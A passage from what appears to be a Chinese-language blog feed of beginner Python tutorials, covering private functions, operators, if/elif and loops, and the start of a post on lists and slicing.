id="六-非公开函数"><font color="#FF6347" face="Comic sans MS">六. 非公开函数</font><a href="post/Python-Function#六-非公开函数"></a></h3><blockquote><p><font color="#FF7F00"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p></blockquote><p>类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；</p><p>之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</p><p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_private_1</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello, %s'</span> <span class="token operator">%</span> name<span class="token keyword">def</span> <span class="token function">_private_2</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hi, %s'</span> <span class="token operator">%</span> name<span class="token keyword">def</span> <span class="token function">greeting</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _private_1<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _private_2<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：</p><p>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-运算符</title>
      <link href="/post/Python-Operators/"/>
      <url>/post/Python-Operators/</url>
      
        <content type="html"><![CDATA[<p>要常来骚扰…₍ ..̮ ₎ ₍ ..̮ ₎ </p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">运算符</font> </center><br><br><p>Python语言支持以下类型的运算符:</p><ul><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf1" target="_blank" rel="noopener">算术运算符</a></font></p></li><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf2" target="_blank" rel="noopener">比较（关系）运算符</a></font></p></li><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf3" target="_blank" rel="noopener">赋值运算符</a></font></p></li><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf4" target="_blank" rel="noopener">逻辑运算符</a></font></p></li><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf5" target="_blank" rel="noopener">位运算符</a></font></p></li><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf6" target="_blank" rel="noopener">成员运算符</a></font></p></li><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf7" target="_blank" rel="noopener">身份运算符</a></font></p></li><li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf8" target="_blank" rel="noopener">运算符优先级</a></font></p></li></ul><br><br><h3 id="一-算术运算符"><font color="#FF6347" face="Comic sans MS"> 一. 算术运算符</font><a href="post/Python-Operators#一-算术运算符"></a></h3><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加 - 两个对象相加</td><td align="left">a + b 输出结果 30</td></tr><tr><td align="left">-</td><td align="left">减 - 得到负数或是一个数减去另一个数</td><td align="left">a - b 输出结果 -10</td></tr><tr><td align="left">*</td><td align="left">乘 - 两个数相乘或是返回一个被重复若干次的字符串</td><td align="left">a * b 输出结果 200</td></tr><tr><td align="left">/</td><td align="left">除 - x除以y</td><td align="left">b / a 输出结果 2</td></tr><tr><td align="left">%</td><td align="left">取模 - 返回除法的余数</td><td align="left">b % a 输出结果 0</td></tr><tr><td align="left">**</td><td align="left">幂 - 返回x的y次幂</td><td align="left">a**b 为10的20次方，<br>输出结果 100000000000000000000</td></tr><tr><td align="left">//</td><td align="left">取整除 - 返回商的整数部分（向下取整）</td><td align="left">&gt;&gt;&gt;&gt; 9//2<br>4<br>&gt;&gt;&gt; -9//2<br>-5</td></tr></tbody></table></div></div><br><br><h3 id="二-比较运算符"><font color="#FF6347" face="Comic sans MS"> 二. 比较运算符</font><a href="post/Python-Operators#二-比较运算符"></a></h3><p>以下假设变量a为10，变量b为20：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">等于 - 比较对象是否相等</td><td align="left">(a == b) 返回 False。</td></tr><tr><td align="left">!=</td><td align="left">不等于 - 比较两个对象是否不相等</td><td align="left">(a != b) 返回 True。</td></tr><tr><td align="left">&gt;</td><td align="left">大于 - 返回x是否大于y</td><td align="left">(a &gt; b) 返回 False。</td></tr><tr><td align="left">&lt;</td><td align="left">小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。<br>这分别与特殊的变量True和False等价。注意，这些变量名的大写。</td><td align="left">(a &lt; b) 返回 True。</td></tr><tr><td align="left">&gt;=</td><td align="left">大于等于 - 返回x是否大于等于y。</td><td align="left">(a &gt;= b) 返回 False。</td></tr><tr><td align="left">&lt;=</td><td align="left">小于等于 - 返回x是否小于等于y。</td><td align="left">(a &lt;= b) 返回 True。</td></tr></tbody></table></div></div><br><br><h3 id="三-赋值运算符"><font color="#FF6347" face="Comic sans MS">三. 赋值运算符</font><a href="post/Python-Operators#三-赋值运算符"></a></h3><p>以下假设变量a为10，变量b为20：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">简单的赋值运算符</td><td align="left">c = a + b 将 a + b 的运算结果赋值为 c</td></tr><tr><td align="left">+=</td><td align="left">加法赋值运算符</td><td align="left">c += a 等效于 c = c + a</td></tr><tr><td align="left">-=</td><td align="left">减法赋值运算符</td><td align="left">c -= a 等效于 c = c - a</td></tr><tr><td align="left">*=</td><td align="left">乘法赋值运算符</td><td align="left">c *= a 等效于 c = c * a</td></tr><tr><td align="left">/=</td><td align="left">除法赋值运算符</td><td align="left">c /= a 等效于 c = c / a</td></tr><tr><td align="left">%=</td><td align="left">取模赋值运算符</td><td align="left">c %= a 等效于 c = c % a</td></tr><tr><td align="left">**=</td><td align="left">幂赋值运算符</td><td align="left">c **= a 等效于 c = c ** a</td></tr><tr><td align="left">//=</td><td align="left">取整除赋值运算符</td><td align="left">c //= a 等效于 c = c // a</td></tr></tbody></table></div></div><br><br><h3 id="四-位运算符"><font color="#FF6347" face="Comic sans MS">四. 位运算符</font><a href="post/Python-Operators#四-位运算符"></a></h3><p>按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下：</p><p>下表中变量 a 为 60，b 为 13二进制格式如下：</p><p>||<br>:-|<br>a = 0011 1100|<br>b = 0000 1101|<br>a&amp;b = 0000 1100|<br>a丨b = 0011 1101|<br>a^b = 0011 0001|<br><code>~a</code>  = 1100 0011|</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与运算符：<br>参与运算的两个值,如果两个相应位都为1,<br>则该位的结果为1,否则为0</td><td align="left">(a &amp; b) 输出结果 12 <br>二进制解释： 0000 1100</td></tr><tr><td align="left">丨</td><td align="left">按位或运算符：<br>只要对应的二个二进位有一个为1时，结果位就为1。</td><td align="left">(a 丨 b) 输出结果 61 <br>二进制解释： 0011 1101</td></tr><tr><td align="left">^</td><td align="left">按位异或运算符：<br>当两对应的二进位相异时，结果为1</td><td align="left">(a ^ b) 输出结果 49 <br>二进制解释： 0011 0001</td></tr><tr><td align="left">~</td><td align="left">按位取反运算符：<br>对数据的每个二进制位取反,<br>即把1变为0,把0变为1。~x 类似于 -x-1</td><td align="left">(~a ) 输出结果 -61 <br>二进制解释： 1100 0011 <br>在一个有符号二进制数的补码形式。</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移动运算符：<br>运算数的各二进位全部左移若干位，<br>由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td><td align="left">a &lt;&lt; 2 输出结果 240 <br>二进制解释： 1111 0000</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移动运算符：<br>把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，<br>“&gt;&gt;”右边的数指定移动的位数</td><td align="left">a &gt;&gt; 2 输出结果 15 <br>二进制解释： 0000 1111</td></tr></tbody></table></div></div><br><br><h3 id="五-逻辑运算符"><font color="#FF6347" face="Comic sans MS">五. 逻辑运算符</font><a href="post/Python-Operators#五-逻辑运算符"></a></h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">逻辑表达式</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">and</td><td align="left">x and y</td><td align="left">布尔”与” - 如果 x 为 False，<br>x and y 返回 False，否则它返回 y 的计算值。</td><td align="left">(a and b) 返回 20。</td></tr><tr><td align="left">or</td><td align="left">x or y</td><td align="left">布尔”或” - 如果 x 是 True，<br>它返回 x 的值，否则它返回 y 的计算值。</td><td align="left">(a or b) 返回 10。</td></tr><tr><td align="left">not</td><td align="left">not x</td><td align="left">布尔”非” - 如果 x 为 True，<br>返回 False 。如果 x 为 False，它返回 True。</td><td align="left">not(a and b) 返回 False</td></tr></tbody></table></div></div><br><br><h3 id="六-成员运算符"><font color="#FF6347" face="Comic sans MS">六. 成员运算符</font><a href="post/Python-Operators#六-成员运算符"></a></h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">in</td><td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td><td align="left">x 在 y 序列中 , <br>如果 x 在 y 序列中返回 True。</td></tr><tr><td align="left">not in</td><td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td align="left">x 不在 y 序列中 , <br>如果 x 不在 y 序列中返回 True。</td></tr></tbody></table></div></div><br><br><h3 id="七-身份运算符"><font color="#FF6347" face="Comic sans MS">七. 身份运算符</font><a href="post/Python-Operators#七-身份运算符"></a></h3><p>身份运算符用于比较两个对象的存储单元。<br><strong>注：</strong><font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-id.html" target="_blank" rel="noopener">id() 函数</a>]</font> 用于获取对象内存地址。</p><p>is 与 == 区别：<font color="#FF7F00"><strong>is 用于判断两个变量引用对象是否为同一个， == 用于判断引用变量的值是否相等</strong></font>。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">is</td><td align="left">is 是判断两个标识符是不是引用自一个对象</td><td align="left">x is y, 类似 id(x) == id(y) 。<br> 如果引用的是同一个对象则返回 True，<br>否则返回 False</td></tr><tr><td align="left">is not</td><td align="left">is not 是判断两个标识符是不是引用自不同对象</td><td align="left">x is not y ， 类似 id(a) != id(b)。<br>如果引用的不是同一个对象则返回结果 True，<br>否则返回 False。</td></tr></tbody></table></div></div><br><br><h3 id="八-运算符优先级"><font color="#FF6347" face="Comic sans MS">八. 运算符优先级</font><a href="post/Python-Operators#八-运算符优先级"></a></h3><p>以下表格列出了从最高到最低优先级的所有运算符：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">**</td><td align="left">指数 (最高优先级)</td></tr><tr><td align="left">~ + -</td><td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td align="left">* / % //</td><td align="left">乘，除，取模和取整除</td></tr><tr><td align="left">+ -</td><td align="left">加法减法</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">&lt;&lt;    右移，左移运算符</td></tr><tr><td align="left">&amp;</td><td align="left">位 ‘AND’</td></tr><tr><td align="left">^ 丨</td><td align="left">位运算符</td></tr><tr><td align="left">&lt;= &lt; &gt; &gt;=</td><td align="left">比较运算符</td></tr><tr><td align="left">&lt;&gt; == !=</td><td align="left">等于运算符</td></tr><tr><td align="left">= %= /= //= -= += <em>= *</em>=</td><td align="left">赋值运算符</td></tr><tr><td align="left">is is not</td><td align="left">身份运算符</td></tr><tr><td align="left">in not in</td><td align="left">成员运算符</td></tr><tr><td align="left">and or not</td><td align="left">逻辑运算符</td></tr></tbody></table></div></div>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-条件语句与循环</title>
      <link href="/post/Python-ConditionalStatements-loops/"/>
      <url>/post/Python-ConditionalStatements-loops/</url>
      
        <content type="html"><![CDATA[<p>记得冒号和换行的缩进呀…(｡◕︎‿◕︎)ﾉﾟ･ﾟ･</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">条件语句与循环</font> </center><br><br><h3 id="一-条件语句"><font color="#FF6347" face="Comic sans MS">一. 条件语句</font><a href="post/Python-ConditionalStatements-loops#一-条件语句"></a></h3><br><ol><li><p>if-else-elif是条件语句，判断bool类型，判断为True就继续执行后面的缩进语句，判断为Flase则不执行缩进语句。</p></li><li><p>Python程序语言指定任何非0和非空（Null）值为True，0 或者 null为False。</p></li><li><p>Python<font color="#FF7F00"><strong>只执行if-elif-else 结构中的一个代码块</strong></font>，它依次检查每个条件测试，直到遇到通过了的条件测试。测试通过后，Python将执行紧跟在它后面的代码，并跳过余下的测试。</p></li><li><p>python 并<font color="#FF7F00"><strong>不支持 switch 语句</strong></font>，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。</p></li><li><p>设置if 语句的格式。在条件测试的格式设置方面，PEP 8提供的唯一建议是，在诸如== 、&gt;= 和&lt;= 等比较运算符两边各添加一个空格，例如，<code>if age &lt; 4:</code> 要比<code>if age&lt;4:</code> 好。这样的空格不会影响Python对代码的解读，而只是让代码阅读起来更容易。</p></li><li><p>注意条件语句如果有多条缩进语句时<font color="#FF7F00"><strong>不能忘了冒号（ <code>:</code> ）</strong></font>，不像C语言或其它语言一样，if后面没有括号。</p></li></ol><br><p>书写格式如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> <span class="token operator">&lt;</span>条件判断<span class="token number">1</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>执行<span class="token number">1</span><span class="token operator">></span><span class="token keyword">elif</span> <span class="token operator">&lt;</span>条件判断<span class="token number">2</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>执行<span class="token number">2</span><span class="token operator">></span><span class="token keyword">elif</span> <span class="token operator">&lt;</span>条件判断<span class="token number">3</span><span class="token operator">></span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>执行<span class="token number">3</span><span class="token operator">></span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>执行<span class="token number">4</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="二-循环语句"><font color="#FF6347" face="Comic sans MS">二. 循环语句</font><a href="post/Python-ConditionalStatements-loops#二-循环语句"></a></h3><br><p>Python提供了for循环和while循环（在Python中<strong>没有do..while循环</strong>）:</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">循环类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-while-loop.html" target="_blank" rel="noopener">while 循环</a></font></td><td align="left">在给定的判断条件为 true 时执行循环体，否则退出循环体。</td></tr><tr><td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-for-loop.html" target="_blank" rel="noopener">for 循环</a></font></td><td align="left">重复执行语句</td></tr><tr><td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-nested-loops.html" target="_blank" rel="noopener">嵌套循环</a></font></td><td align="left">你可以在while循环体中嵌套for循环</td></tr></tbody></table></div></div><br><p><strong>循环控制语句</strong><br>循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">循环类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-break-statement.html" target="_blank" rel="noopener">break 语句</a></font></td><td align="left">在语句块执行过程中终止循环，并且跳出整个循环</td></tr><tr><td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-continue-statement.html" target="_blank" rel="noopener">continue 语句</a></font></td><td align="left">在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</td></tr><tr><td align="center"><font color="#00B2EE"><a href="http://www.runoob.com/python/python-pass-statement.html" target="_blank" rel="noopener">pass 语句</a></font></td><td align="left">pass是空语句，是为了保持程序结构的完整性。</td></tr></tbody></table></div></div><br><h4 id="2-1-While-循环语句"><font color="#3CB371" face="Comic sans MS">2.1 While 循环语句</font><a href="post/Python-ConditionalStatements-loops#2-1-While-循环语句"></a></h4><p>执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（Null）的值均为True。当判断条件假False时，循环结束。其基本形式为（<strong>注意并没有括号</strong>）：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">while</span> 判断条件：    执行语句……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><p>Gif 演示 Python while 语句执行过程：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/01/5c789f82d8f65.gif" alt="loop-over-python-list-animation.gif" data-zoomable></p></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>循环使用 else 语句：</strong></font></p><p>在 python 中，while … else 在循环条件为 False 时执行 else 语句块：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token string">" is  less than 5"</span><span class="token punctuation">)</span>   count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token string">" is not less than 5"</span><span class="token punctuation">)</span>运行结果：<span class="token number">0</span>  <span class="token keyword">is</span>  less than <span class="token number">5</span> <span class="token number">1</span>  <span class="token keyword">is</span>  less than <span class="token number">5</span> <span class="token number">2</span>  <span class="token keyword">is</span>  less than <span class="token number">5</span> <span class="token number">3</span>  <span class="token keyword">is</span>  less than <span class="token number">5</span> <span class="token number">4</span>  <span class="token keyword">is</span>  less than <span class="token number">5</span> <span class="token number">5</span>  <span class="token keyword">is</span> <span class="token operator">not</span> less than <span class="token number">5</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="2-2-for-in-语句"><font color="#3CB371" face="Comic sans MS">2.2 for..in 语句</font><a href="post/Python-ConditionalStatements-loops#2-2-for-in-语句"></a></h4><ol><li><p>Python for循环可以遍历任何序列的项目，如一个<font color="#FF7F00"><strong>列表</strong></font>或者一个<font color="#FF7F00"><strong>字符串</strong></font>。</p></li><li><p>Python 中的 for 语句和 C 或 Pascal 中的略有不同。通常的循环可能会依据一个等差数值步进过程（如 Pascal），或由用户来定义迭代步骤和中止条件（如 C ），Python 的 for 语句依据任意序列（列表或字符串）中的子项，按它们在序列中的顺序来进行迭代。</p></li><li><p>在迭代过程中修改迭代序列不安全（只有在使用列表这样的可变序列时才会有这样的情况）。如果你想要修改你迭代的序列（例如，复制选择项），你可以迭代它的复本。使用切割标识就可以很方便的做到这一点</p></li></ol><br><blockquote><p><font color="#00B2EE" face="Comic sans MS"><strong>for…in语句处理字符串和列表不同：</strong></font></p><ol><li><strong>处理列表：</strong><font color="#FF7F00"><strong>每次取列表的一个元素赋给 in 前面的变量</strong></font>；</li><li><strong>处理字符串：</strong><font color="#FF7F00"><strong>每次取字符串的一个字符赋给 in 前面的变量</strong></font>；</li></ol></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'beauty'</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>运行结果：<span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> b e a u t y <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p><font color="#FF7F00"><strong>上例列表 for x in …循环就是把每个元素代入变量x，然后执行缩进块的语句。这就像把序列中的每一个数(或对象)分配给x，一次一个,然后为每个x值执行语句块。</strong></font></p></blockquote><br><h4 id="2-2-break、continue、pass-语句"><font color="#3CB371" face="Comic sans MS">2.2 break、continue、pass 语句</font><a href="post/Python-ConditionalStatements-loops#2-2-break、continue、pass-语句"></a></h4><p><font color="#FF7F00"><strong>break语句：</strong></font> 在循环中，可以提前退出循环。<br><font color="#FF7F00"><strong>break语句：</strong></font> 在循环过程中，跳过当前的这次循环，直接开始下一次循环。<br><font color="#FF7F00"><strong>pass语句：</strong></font> pass 是空语句，是为了保持程序结构的完整性。pass 不做任何事情，一般用做占位语句。</p><br>    <p>Python 语言 pass 语句语法格式如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># 输出 Python 的每个字母</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> <span class="token string">'Python'</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'h'</span><span class="token punctuation">:</span>      <span class="token keyword">pass</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是 pass 块'</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'当前字母 :'</span><span class="token punctuation">,</span> letter<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Good bye!'</span><span class="token punctuation">)</span>运行结果：当前字母 <span class="token punctuation">:</span> P 当前字母 <span class="token punctuation">:</span> y 当前字母 <span class="token punctuation">:</span> t 这是 <span class="token keyword">pass</span> 块 当前字母 <span class="token punctuation">:</span> h 当前字母 <span class="token punctuation">:</span> o 当前字母 <span class="token punctuation">:</span> n Good bye! <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-列表、元组、字典、集合</title>
      <link href="/post/Python-list-tuple-dict-set/"/>
      <url>/post/Python-list-tuple-dict-set/</url>
      
        <content type="html"><![CDATA[<p>Python的列表相当于数组 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">Python 列表、元组、字典、集合</font> </center><br><br><h3 id="一-认识列表"><font color="#FF6347" face="Comic sans MS">一. 认识列表</font><a href="post/Python-list-tuple-dict-set#一-认识列表"></a></h3><br><blockquote><p><font color="#00B2EE" face="Comic sans MS"><strong>列表（list）是什么：</strong></font></p><ol><li>序列是Python中最基本的数据结构。</li><li>在Python中，用方括号 [ ] 来表示列表，并用逗号来分隔其中的元素。并且<font color="#FF7F00"><strong>列表的数据项（各个元素）不需要具有相同的类型</strong></font>。</li><li>序列中的每个元素都分配一个数字 - 它的位置，即索引，<font color="#FF7F00"><strong>第一个索引是0，第二个索引是1，依此类推</strong></font>。<ol><li>序列都可以进行的操作包括索引，切片，加，乘，检查成员。</li><li>此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。</li></ol></li><li>把列表当作堆栈使用。涉及的方法有：append()、pop()</li><li>访问和使用列表可以使用切片。[a:b]</li><li>把列表当作队列使用（不过使用起来较麻烦，可自行百度）。</li><li>列表可以<font color="#FF7F00"><strong>嵌套使用</strong></font>。</li><li>列表复制是这样的：<code>list2 = list1[:]</code></li><li>获取列表的索引值：<code>a = list.index(&quot;String&quot;)</code></li></ol></blockquote><br><p>定义列表的示例：</p><pre class="line-numbers language-python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">]</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token string">'physics'</span><span class="token punctuation">,</span> <span class="token string">'chemistry'</span><span class="token punctuation">,</span> <span class="token number">1997</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="二-切片"><font color="#FF6347" face="Comic sans MS">二. 切片</font><a href="post/Python-list-tuple-dict-set#二-切片"></a></h3><blockquote><p><font color="#00B2EE" face="Comic sans MS"><strong>切片和索引：</strong></font></p><ol><li>与字符串的索引一样，列表索引从0开始。(在字符串那个章节总结过)列表可以进行截取、组合等；</li><li>你还可以处理列表的部分元素——Python称之为切片。使用下标索引来访问列表中的值，同样你也可以使用方括号[ ]的形式截取字符； [x:y]</li><li>要创建切片，可指定要使用的第一个元素和最后一个元素的索引。与函数range() 一样，Python在<font color="#FF7F00"><strong>到达你指定的第二个索引前面的元素后停止</strong></font>。要输出列表中的前三个元素，需要指定索引<code>0~3</code>，这将输出分别为0 、1 和2 的元素； [1:5]表示索引为1,2,3,4的四个元素</li><li>如果你没有指定第一个索引，Python将自动从列表开头开始； [ :6]</li><li>要让切片终止于列表末尾，也可使用类似的语法，即不指定第二个索引； [2: ]<br>无论列表多长，这种语法都能够让你输出从特定位置到列表末尾的所有元素。</li><li>如果要遍历列表的部分元素，可在for 